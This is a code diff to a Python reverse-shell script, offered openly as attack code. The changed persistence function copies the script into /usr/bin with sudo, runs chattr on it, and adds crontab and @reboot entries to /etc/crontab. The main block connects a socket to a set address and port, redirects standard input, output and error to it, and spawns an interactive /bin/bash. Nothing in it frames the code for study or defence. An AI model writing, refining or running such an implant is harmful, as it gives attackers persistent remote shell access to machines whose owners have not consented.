@@ -16,19 +16,11 @@ import os
 
 def __persistence():
     import time
-    os.system('clear')
-    file_exist_check = os.path.exists("reverseshell.py")
-
-    if file_exist_check == True:   
-        os.system('sudo cp reverseshell.py /usr/bin') # copy the reverseshell to /usr/bin
-        run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
-        run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
-        run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
-        time.sleep(1.25)
-    elif file_exist_check == False:  
-        pass
-    else:
-        return __persistence()
+    os.system('sudo cp reverseshell.py /usr/bin') # copy the reverseshell to /usr/bin
+    run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
+    run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
+    run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
+    time.sleep(1.25)
 
 class shell:
     
@@ -39,6 +31,7 @@ class shell:
 reverse_connection = shell("127.0.0.1", int(5003)) # define target ip address and target port
 
 if __name__ == "__main__":
+    os.system('clear')
     __persistence() # call the persistence function
     from os import dup2
     import socket
@@ -54,4 +47,5 @@ if __name__ == "__main__":
     dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
     dup2(socket_sock.fileno(),2)
     run(["/bin/bash"], shell=True) # run the bash console interactive shell
+
     
